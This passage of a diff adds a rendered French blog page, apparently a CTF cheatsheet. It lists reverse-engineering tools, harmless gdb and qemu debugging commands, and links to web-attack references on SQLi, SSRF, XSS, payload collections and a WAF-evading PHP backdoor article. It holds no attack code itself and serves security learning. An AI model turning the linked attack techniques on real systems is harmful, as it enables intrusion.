+<p><a href="https://reverse.zip" target="_blank" rel="noopener noreffer ">https://reverse.zip</a></p>
+</li>
+<li>
+<p><a href="https://tmpout.sh/" target="_blank" rel="noopener noreffer ">https://tmpout.sh/</a></p>
+</li>
+<li>
+<p><a href="https://crackmes.one" target="_blank" rel="noopener noreffer ">Plateforme Crackme.one</a></p>
+</li>
+<li>
+<p><code>Awesome Reversing +</code>:  <a href="https://github.com/wtsxDev/reverse-engineering" target="_blank" rel="noopener noreffer ">https://github.com/wtsxDev/reverse-engineering</a></p>
+</li>
+<li>
+<p><a href="https://bbinfosec.medium.com/reverse-engineering-resources-beginners-to-intermediate-guide-li%3e" target="_blank" rel="noopener noreffer ">https://bbinfosec.medium.com/reverse-engineering-resources-beginners-to-intermediate-guide-li></a></p>
+</li>
+<li>
+<p><a href="https://www.youtube.com/@StephenChapman" target="_blank" rel="noopener noreffer ">https://www.youtube.com/@StephenChapman</a></p>
+</li>
+<li>
+<p><a href="https://m.youtube.com/c/oalabs" target="_blank" rel="noopener noreffer ">https://m.youtube.com/c/oalabs</a></p>
+</li>
+</ul>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/TUtQcezMDUU" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<h3 id="quelques-outils">Quelques outils:</h3>
+<p>À posséder:</p>
+<ul>
+<li>
+<p>En ligne:</p>
+<ul>
+<li><code>Dogbolt (decompiler explorer)</code>: compare le pseudo code source de différents outils (Ghidra, Hex Rays, Ida, Binary Ninja) rapidement</li>
+<li><code>Disassembler.io</code></li>
+</ul>
+</li>
+<li>
+<p><code>Ghidra</code> : <a href="https://ghidra-sre.org/" target="_blank" rel="noopener noreffer ">https://ghidra-sre.org/</a> (clone d&rsquo;après les sources du git)</p>
+</li>
+<li>
+<p><code>UPX unpacker</code> : <a href="https://github.com/NozomiNetworks/upx-recovery-tool" target="_blank" rel="noopener noreffer ">https://github.com/NozomiNetworks/upx-recovery-tool</a></p>
+</li>
+</ul>
+<h3 id="windows">Windows</h3>
+<p>Reverse: décompilos:</p>
+<ul>
+<li><code>DotPeek</code> : <a href="https://www.jetbrains.com/fr-fr/decompiler/" target="_blank" rel="noopener noreffer ">https://www.jetbrains.com/fr-fr/decompiler/</a> -&gt; parfait pour du <code>.NET</code></li>
+<li><code>DnSpy</code> : <a href="https://github.com/dnSpy/dnSpy" target="_blank" rel="noopener noreffer ">https://github.com/dnSpy/dnSpy</a> -&gt; plus maintenu</li>
+</ul>
+<h3 id="linux">Linux</h3>
+<p>Outils classiques:</p>
+<ul>
+<li>
+<p><code>objdump</code>:
+<code>-t</code> : afficher la table des symboles -&gt; si rien : voir ../../pwn/asm
+<code>-h</code>: afficher les sections</p>
+</li>
+<li>
+<p><code>ltrace</code>: voir les fonctions de la libc appelées</p>
+</li>
+<li>
+<p><code>strace</code>: voir les syscalls</p>
+</li>
+<li>
+<p><code>ldd</code>: voir les bibliothèques/libc utilisées (Hijacking, <a href="../pwn/stack/ret2libc" rel="">ret2libc</a></p>
+</li>
+</ul>
+<p>Débuggers:</p>
+<ul>
+<li><code>gdb</code>: <a href="https://github.com/hugsy/gef" target="_blank" rel="noopener noreffer ">gef</a></li>
+<li><code>r2</code>: <a href="https://github.com/radareorg/radare2" target="_blank" rel="noopener noreffer ">https://github.com/radareorg/radare2</a></li>
+<li><code>x64dbg</code> (windows)</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">alias</span> <span class="nv">pwndbg</span><span class="o">=</span><span class="s1">&#39;gdb -x ~/pwndbg/gdbinit.py -q &#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">alias</span> <span class="nv">gef</span><span class="o">=</span><span class="s1">&#39;gdb -x ~/.gdbinit-gef.py -q &#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">alias</span> gdb-peda<span class="o">=</span><span class="s1">&#39;gdb -x ~/peda/peda.py&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="arm">ARM</h3>
+<p><a href="https://www.acmesystems.it/arm9_toolchain" target="_blank" rel="noopener noreffer ">https://www.acmesystems.it/arm9_toolchain</a>
+<a href="https://0x90909090.blogspot.com/2014/01/how-to-debug-arm-binary-under-x86-linux.html" target="_blank" rel="noopener noreffer ">https://0x90909090.blogspot.com/2014/01/how-to-debug-arm-binary-under-x86-linux.html</a></p>
+<p>Compiler :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arm-linux-gnueabihf-gcc -fno-pie -ggdb3 -no-pie -o hello_world hello_world.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Exécuter :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">qemu-arm -L /usr/arm-linux-gnueabihf -g <span class="m">1234</span> ./hello_world
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reverser :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gdb-multiarch -q --nh <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -ex <span class="s1">&#39;set architecture arm&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -ex <span class="s1">&#39;set sysroot /usr/arm-linux-gnueabihf&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -ex <span class="s1">&#39;file hello_world&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -ex <span class="s1">&#39;target remote localhost:1234&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -ex <span class="s1">&#39;break main&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -ex <span class="k">continue</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -ex <span class="s1">&#39;layout split&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="mips">MIPS</h3>
+<p><a href="https://pr0cf5.github.io/ctf/2019/07/16/mips-userspace-debugging.html" target="_blank" rel="noopener noreffer ">https://pr0cf5.github.io/ctf/2019/07/16/mips-userspace-debugging.html</a></p>
+<h3 id="riscv">RiscV</h3>
+<p><a href="https://danielmangum.com/posts/risc-v-bytes-qemu-gdb/#installing-tools" target="_blank" rel="noopener noreffer ">https://danielmangum.com/posts/risc-v-bytes-qemu-gdb/#installing-tools</a></p>
+<h3 id="bytecode--outils-spécifiques">Bytecode / Outils spécifiques</h3>
+<ul>
+<li>Python: <code>uncompyle</code></li>
+<li>Java: <code>jadx</code></li>
+<li>Android: <code>jadx</code>, <code>apktool</code>, <code>adb</code></li>
+<li>Rust: <a href="https://github.com/h311d1n3r/Cerberus" target="_blank" rel="noopener noreffer ">https://github.com/h311d1n3r/Cerberus</a></li>
+<li>Unity: <a href="https://github.com/imadr/Unity-game-hacking#unity-game-folder-structure" target="_blank" rel="noopener noreffer ">https://github.com/imadr/Unity-game-hacking#unity-game-folder-structure</a></li>
+</ul>
+<h2 id="web">Web</h2>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/4Jk_I-cw4WE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<h3 id="documentation-5">Documentation</h3>
+<ul>
+<li>
+<p><a href="https://owasp.org/www-community/Source_Code_Analysis_Tools" target="_blank" rel="noopener noreffer ">https://owasp.org/www-community/Source_Code_Analysis_Tools</a></p>
+</li>
+<li>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreffer ">Payload all the things</a></p>
+</li>
+<li>
+<p><a href="https://book.hacktricks.xyz/welcome/readme" target="_blank" rel="noopener noreffer ">Hacktricks</a></p>
+</li>
+<li>
+<p><a href="https://github.com/payloadbox" target="_blank" rel="noopener noreffer ">PayloadBox</a></p>
+</li>
+</ul>
+<p><code>GraphQL</code></p>
+<ul>
+<li><a href="https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql" target="_blank" rel="noopener noreffer ">https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql</a></li>
+<li><a href="https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/" target="_blank" rel="noopener noreffer ">https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/</a></li>
+<li><a href="https://ivangoncharov.github.io/graphql-voyager/" target="_blank" rel="noopener noreffer ">https://ivangoncharov.github.io/graphql-voyager/</a></li>
+</ul>
+<p><code>SQLi</code></p>
+<ul>
+<li><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noopener noreffer ">https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/</a></li>
+</ul>
+<p><code>PHP</code></p>
+<ul>
+<li><code>Type Juggling</code> <a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf" target="_blank" rel="noopener noreffer ">https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf</a></li>
+<li><code>Eval</code> <a href="https://www.defenxor.com/blog/writing-simple-php-non-alphanumeric-backdoor-to-evade-waf/" target="_blank" rel="noopener noreffer ">https://www.defenxor.com/blog/writing-simple-php-non-alphanumeric-backdoor-to-evade-waf/</a></li>
+</ul>
+<p><code>SSRF</code></p>
+<ul>
+<li><a href="https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/" target="_blank" rel="noopener noreffer ">https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/</a></li>
+<li><a href="https://www.dailysecurity.fr/server-side-request-forgery/" target="_blank" rel="noopener noreffer ">https://www.dailysecurity.fr/server-side-request-forgery/</a></li>
+</ul>
+<p><code>XXE</code></p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" target="_blank" rel="noopener noreffer ">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity</a></li>
+</ul>
+<hr>
+<p><code>CSRF</code></p>
+<ul>
+<li><a href="https://n-pn.fr/t/1277-tout-sur-les-attack-csrf---cross-site-request-forgery" target="_blank" rel="noopener noreffer ">https://n-pn.fr/t/1277-tout-sur-les-attack-csrf---cross-site-request-forgery</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection" target="_blank" rel="noopener noreffer ">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection</a></li>
+</ul>
+<p><code>XSS</code></p>
+<ul>
+<li><a href="https://beta.hackndo.com/attaque-xss/" target="_blank" rel="noopener noreffer ">https://beta.hackndo.com/attaque-xss/</a></li>
+<li><a href="https://excess-xss.com/" target="_blank" rel="noopener noreffer ">https://excess-xss.com/</a></li>
+<li><a href="https://learn-cyber.net/article/Self-XSS-Attacks" target="_blank" rel="noopener noreffer ">https://learn-cyber.net/article/Self-XSS-Attacks</a></li>
+<li><a href="https://learn-cyber.net/article/Reflected-XSS-Attacks" target="_blank" rel="noopener noreffer ">https://learn-cyber.net/article/Reflected-XSS-Attacks</a></li>
+</ul>
+<hr>
+<ul>
+<li><a href="https://www.nzeros.me/2023/08/07/securinetsminictf2k22/" target="_blank" rel="noopener noreffer ">https://www.nzeros.me/2023/08/07/securinetsminictf2k22/</a></li>
+<li><a href="https://mizu.re/tag/FCSC2023" target="_blank" rel="noopener noreffer ">https://mizu.re/tag/FCSC2023</a></li>
+</ul>
+<h3 id="extensions">Extensions</h3>
+<ul>
+<li><a href="https://addons.mozilla.org/fr/firefox/addon/hacktools/" target="_blank" rel="noopener noreffer ">Hacktools</a></li>
+<li><a href="https://addons.mozilla.org/fr/firefox/addon/wappalyzer/" target="_blank" rel="noopener noreffer ">Wappalyzer</a></li>
+</ul>
+<h3 id="tools-2">Tools</h3>
+<ul>
+<li>
+<p><a href="https://portswigger.net/burp" target="_blank" rel="noopener noreffer ">Burp</a> (Hackvertor, JWT, Param Miner)</p>
+</li>
+<li>
+<p><a href="https://github.com/ticarpi/jwt_tool" target="_blank" rel="noopener noreffer ">Jwt_tool</a></p>
+</li>
+<li>
+<p><a href="https://beeceptor.com/" target="_blank" rel="noopener noreffer ">Beeceptor</a></p>
+</li>
+<li>
+<p><a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener noreffer ">CSP Evaluator</a></p>
+</li>
+<li>
+<p><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener noreffer ">Gopherus</a></p>
+</li>
+<li>
+<p><a href="https://validator.w3.org/feed/" target="_blank" rel="noopener noreffer ">RSS Validator</a></p>
+</li>
+<li>
+<p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener noreffer ">Tplmap</a></p>
+</li>
+<li>
+<p><a href="https://archive.org" target="_blank" rel="noopener noreffer ">Wayback machine </a>, <a href="https://archive.md/" target="_blank" rel="noopener noreffer ">https://archive.md/</a> (web archive par mots clés &amp; copie de sites)</p>
+</li>
+</ul>
+<h2 id="web3">Web3</h2>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/xtEQGtaT9MY" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<h3 id="documentation-6">Documentation</h3>
+<ul>
+<li>
+<p><a href="https://beta.hackndo.com/blockchain/" target="_blank" rel="noopener noreffer ">https://beta.hackndo.com/blockchain/</a></p>
+</li>
+<li>
+<p><a href="https://docs.soliditylang.org/en/v0.8.20/" target="_blank" rel="noopener noreffer ">https://docs.soliditylang.org/en/v0.8.20/</a></p>
+</li>
+<li>
+<p><a href="https://ethereum.org/en/developers/docs/" target="_blank" rel="noopener noreffer ">https://ethereum.org/en/developers/docs/</a></p>
+</li>
+<li>
+<p><a href="https://cypherpunks-core.github.io/ethereumbook/" target="_blank" rel="noopener noreffer ">https://cypherpunks-core.github.io/ethereumbook/</a></p>
+</li>
+</ul>
+<h2 id="pour-aller-plus-loin">Pour aller plus loin</h2>
+<h3 id="ressources-générales">Ressources générales</h3>
+<ul>
+<li>
+<p><a href="https://www.youtube.com/@Computerphile" target="_blank" rel="noopener noreffer ">https://www.youtube.com/@Computerphile</a></p>
+</li>
+<li>
+<p><a href="https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/" target="_blank" rel="noopener noreffer ">https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/</a></p>
+</li>
+<li>
+<p><a href="https://hide01.ir/" target="_blank" rel="noopener noreffer ">https://hide01.ir/</a></p>
+</li>
+<li>
+<p><a href="https://github.com/akr3ch/BugBountyBooks" target="_blank" rel="noopener noreffer ">https://github.com/akr3ch/BugBountyBooks</a></p>
+</li>
+</ul>
+<h3 id="chaines">Chaines</h3>
+<p><a href="https://www.youtube.com/c/13cubed" target="_blank" rel="noopener noreffer ">13Cubed</a></p>
+<p><a href="https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw" target="_blank" rel="noopener noreffer ">John Hammond</a></p>
+<p><a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA" target="_blank" rel="noopener noreffer ">IppSec</a></p>
+<p><a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w" target="_blank" rel="noopener noreffer ">LiveOverflow</a></p>
+<p><a href="https://www.youtube.com/c/xct_de/channels" target="_blank" rel="noopener noreffer ">Xct</a></p>
+<h3 id="ctf-24h24-7j7">CTF 24h/24, 7j/7</h3>
+<ul>
+<li><a href="https://fuzzy.land/challenges" target="_blank" rel="noopener noreffer ">https://fuzzy.land/challenges</a></li>
+</ul>
+<h3 id="notes-utiles-en-ctf-voire-">Notes utiles en CTF voire +</h3>
+<ul>
+<li>
+<p><a href="https://cheatsheet.haax.fr/" target="_blank" rel="noopener noreffer ">https://cheatsheet.haax.fr/</a></p>
+</li>
+<li>
+<p><a href="https://exploit-notes.hdks.org/" target="_blank" rel="noopener noreffer ">https://exploit-notes.hdks.org/</a></p>
+</li>
+<li>
+<p><a href="https://notes.vulndev.io/wiki" target="_blank" rel="noopener noreffer ">https://notes.vulndev.io/wiki</a></p>
+</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-07-10</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="//localhost:1313/posts/cheatsheet/" data-title="Cheatsheet" data-hashtags="active directory,crypto,forensic,pwn,reseau,reverse,web,web3"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="//localhost:1313/posts/cheatsheet/" data-hashtag="active directory"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="//localhost:1313/posts/cheatsheet/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/crypto/">Crypto</a>,&nbsp;<a href="/tags/forensic/">Forensic</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/reseau/">Reseau</a>,&nbsp;<a href="/tags/reverse/">Reverse</a>,&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/web3/">Web3</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/salty/" class="prev" rel="prev" title="FCSC 2023 - Salty Auth"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>FCSC 2023 - Salty Auth</a>
+            <a href="/posts/gcc-ctf/" class="next" rel="next" title="GCC 2024- Quelques writeups">GCC 2024- Quelques writeups<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.123.7">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
